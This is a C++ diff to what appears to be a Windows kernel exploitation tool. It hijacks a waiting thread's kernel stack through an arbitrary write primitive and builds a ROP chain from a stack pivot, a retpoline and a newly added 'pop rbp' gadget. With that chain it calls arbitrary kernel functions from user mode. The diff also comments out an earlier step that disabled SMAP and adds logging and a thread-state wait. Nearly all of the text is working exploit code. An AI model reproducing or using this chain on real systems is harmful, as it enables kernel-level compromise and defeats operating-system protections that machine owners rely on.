@@ -2,19 +2,13 @@
 
 #include "Resolves.h"
 #include "Offsets.h"
+#include "Nt.h"
+#include "Log.h"
 
 #include <queue>
 #include <functional>
 #include <condition_variable>
 #include <atomic>
-
-
-extern "C"
-NTSTATUS NtWaitForSingleObject(
-	HANDLE Object,
-	bool Aleratable,
-	DWORD Timeout
-);
 
 constexpr ULONG c_TrapFrameSize = 0x190;
 
@@ -44,8 +38,45 @@ public:
 		const char* FunctionName,
 		Args... Arguments
 	) {
-		kAddress function = g_KernelBinary->ResolveExport(FunctionName);
-		return CallKernelFunction(function, Arguments...);
+		std::optional<kAddress> function = g_KernelBinary->ResolveExport(FunctionName);
+		if (!function) {
+			LOG_WARN( "Failed to resolve function name %s", FunctionName );
+			return -1;
+		}
+
+		return CallKernelFunction(function.value(), Arguments...);
+	}
+
+	static void WaitUntilThreadIsWaiting(DWORD ThreadTid)
+	{
+		HANDLE thread = OpenThread( THREAD_QUERY_INFORMATION, false, ThreadTid );
+		if (thread == 0) {
+			LOG_FAIL( "Failed to acquire thread handle, le=%d", GetLastError() );
+			throw std::runtime_error( "OpenThread" );
+		}
+
+		while (true)
+		{
+			SYSTEM_THREAD_INFORMATION info = { 0 };
+			NTSTATUS status = NtQueryInformationThread(
+				thread,
+				THREADINFOCLASS( ThreadSystemThreadInformation ),
+				&info,
+				sizeof( info ),
+				nullptr
+			);
+
+			if (!NT_SUCCESS( status )) {
+				LOG_FAIL( "Failed to call NtQueryInformationThread, status=0x%08x", status );
+				CloseHandle( thread );
+				throw std::runtime_error( "NtQueryInformationThread" );
+			}
+
+			if (info.ThreadState == static_cast<ULONG>(KTHREAD_STATE::Waiting)) break;
+		}
+
+		LOG_DEBUG( "Finished waiting" );
+		CloseHandle( thread );
 	}
 
 	template <typename... Args>
@@ -55,21 +86,36 @@ public:
 	{
 		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
 		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
+
 		DWORD currentTid = GetCurrentThreadId();
 		void* newStack = nullptr;
 
 		m_TaskQueue.push([&] {
-				kAddress thread = Resolves::GetThreadAddress(currentTid);
-				OverrideThreadStackWithFunctionCall(Function, thread, (Byte**) & newStack, args);
+				LOG_DEBUG( "Starting worker, tid=%d", currentTid );
+
+				WaitUntilThreadIsWaiting( currentTid );
+				std::optional<kAddress> thread = Resolves::GetThreadAddressInProcess(currentTid, GetCurrentProcessId());
+				if (!thread) {
+					FATAL( "Failed to resolve thread address, tid=%d", currentTid );
+				}
+
+				LOG_DEBUG( "Calling kernel function at 0x%llx, thread address is 0x%llx", Function, thread.value() );
+				
+				OverrideThreadStackWithFunctionCall(Function, thread.value(), (Byte**)&newStack, args);
 				SetEvent(event);
 			});
+
+		m_QueueUpdateVariable.notify_all();
 
 		//
 		// TODO: cleanup thread stacks that are created, prob at the end 
 		// as there's no point in reallocating.
 		//
 
-		auto returnValue = Qword(NtWaitForSingleObject(event, false, INFINITE));
+		auto returnValue = Qword(NtWaitForSingleObject(event, false, nullptr));
+		LOG_DEBUG( "Returned from NtWaitForSingleObject, return value is 0x%08llx", returnValue );
+		CloseHandle( event );
+
 		return returnValue;
 	}
 
@@ -121,6 +167,11 @@ private:
 #define PUT_STACK(val) g_Rw->WriteQword(rsp, Qword(val)); rsp += 8;
 
 		//
+		// NOTE: Used to disable SMAP, probably for the better? But for debug purposes we'll just 
+		// go down in the stack enough and assume that the called function doesn't do a lot lol
+		//
+
+		//
 		// Disable SMAP so we could pivot into user stack. Recall the gadget is
 		// 
 		// KiQuantumEnd:
@@ -143,18 +194,26 @@ private:
 		// Note: might come later to fuck us :(
 		//
 
-		PUT_STACK(m_Gadgets.DisableSmap);
+		//PUT_STACK(m_Gadgets.DisableSmap);
+		//
+		//rsp += 0xb8;
+		//PUT_STACK(0x41); // pop r15
+		//PUT_STACK(0x41); // pop r14
+		//PUT_STACK(0x41); // pop r13
+		//PUT_STACK(0x41); // pop r12
+		//PUT_STACK(0x41); // pop rdi
+		//PUT_STACK(0x41); // pop rsi
+		//PUT_STACK(0x41); // pop rbx
+		//PUT_STACK(newStack + c_KernelStackSize); // pop rbp
 		
-		rsp += 0xb8;
-		PUT_STACK(0x41); // pop r15
-		PUT_STACK(0x41); // pop r14
-		PUT_STACK(0x41); // pop r13
-		PUT_STACK(0x41); // pop r12
-		PUT_STACK(0x41); // pop rdi
-		PUT_STACK(0x41); // pop rsi
-		PUT_STACK(0x41); // pop rbx
+		
 		// Our pivot gadget uses rbp as the new stack pointer
-		PUT_STACK(newStack + c_KernelStackSize); // pop rbp
+
+		auto newRsp = rsp - 0x3000;
+
+		PUT_STACK( m_Gadgets.PopRbp );
+		PUT_STACK( newRsp );
+
 
 		//
 		// Stack pivot gadget. Looks as follows:
@@ -175,12 +234,13 @@ private:
 		// Note: We've now switched to usermode stack.
 		//
 
-		auto userRsp = stackTop;
+		//auto userRsp = stackTop;
 
-#undef PUT_STACK
-#define PUT_STACK(val) *(Qword*)(userRsp)++ = Qword(val);
+//#undef PUT_STACK
+//#define PUT_STACK(val) *(Qword*)(userRsp)++ = Qword(val);
 
-		userRsp += 0x30;		// add rsp, 0x30
+		rsp = newRsp;
+		rsp += 0x30;		// add rsp, 0x30
 		PUT_STACK(0x1337);	// pop rdi
 		PUT_STACK(0x1337);	// pop rsp
 		PUT_STACK(0x1337);	// pop rbp
@@ -201,11 +261,11 @@ private:
 
 		PUT_STACK(m_Gadgets.Retpoline);
 
-		userRsp += 0x20;
+		rsp += 0x20;
 
 		// add jump target: Function
 		PUT_STACK(Function);
-		auto* beforeArgsRsp = userRsp;
+		auto beforeArgsRsp = rsp;
 		
 		// add register arguments
 		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
@@ -216,23 +276,26 @@ private:
 		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));
 
 		// update rsp to after add rsp, 0x48
-		userRsp = beforeArgsRsp + 0x28;
+		rsp = beforeArgsRsp + 0x28;
 
 		// add remaining stack arguments
 		
-		userRsp += 0x20; // save shadow space
+		rsp += 0x20; // save shadow space
 
 		if constexpr (NumberOfArguments >= 5) {
 			auto indiciesOfRemainingArgs = std::make_index_sequence<NumberOfArguments - 4>{};
 			Qword remaining[] = { Qword(std::get<indiciesOfRemainingArgs>(Arguments))... };
-			std::memcpy(userRsp, remaining, sizeof(remaining));
 
-			userRsp += sizeof(remaining);
+			g_Rw->WriteBuffer( rsp, std::span<Qword>( remaining, NumberOfArguments ) );
+			//std::memcpy(rsp, remaining, sizeof(remaining));
+
+			rsp += sizeof(remaining);
 		}
 
 		// go back to where we've been - and return to user mode lol
 		
-		std::memcpy(userRsp, previousStackData.data(), previousStackData.size());
+		g_Rw->WriteBuffer( rsp, std::span<Qword>( (Qword*) previousStackData.data(), previousStackData.size() / sizeof(Qword)));
+		//std::memcpy(rsp, previousStackData.data(), previousStackData.size());
 	}
 
 	void WorkerThread()
@@ -251,6 +314,7 @@ private:
 				workItem = std::move(m_TaskQueue.front());
 				m_TaskQueue.pop();
 			}
+			LOG_DEBUG( "Running work item..." );
 			workItem();
 		}
 	}
@@ -324,9 +388,16 @@ private:
 	
 		LOG_DEBUG( "Found stack pivot gadget at 0x%llx", stackPivotAddress.value() );
 
-		auto smapGadget = TryFindSmapGadget();
-		if (!smapGadget) return false;
-		m_Gadgets.DisableSmap = smapGadget.value();
+		auto PopRbpSignature = Sig::FromHex("5dc3");
+		auto popRbp = g_KernelBinary->FindSignature(PopRbpSignature, KernelBinary::LocationFlags::InCode);
+		if (!popRbp) return false;
+		m_Gadgets.PopRbp = popRbp.value();
+
+		LOG_DEBUG( "Found pop rbp gadget at 0x%llx", popRbp.value() );
+
+		//auto smapGadget = TryFindSmapGadget();
+		//if (!smapGadget) return false;
+		//m_Gadgets.DisableSmap = smapGadget.value();
 
 		LOG_INFO( "Found all gadgets!" );
 
@@ -345,5 +416,6 @@ private:
 		kAddress Retpoline;
 		kAddress StackPivot;
 		kAddress DisableSmap;
+		kAddress PopRbp;
 	} m_Gadgets;
 };
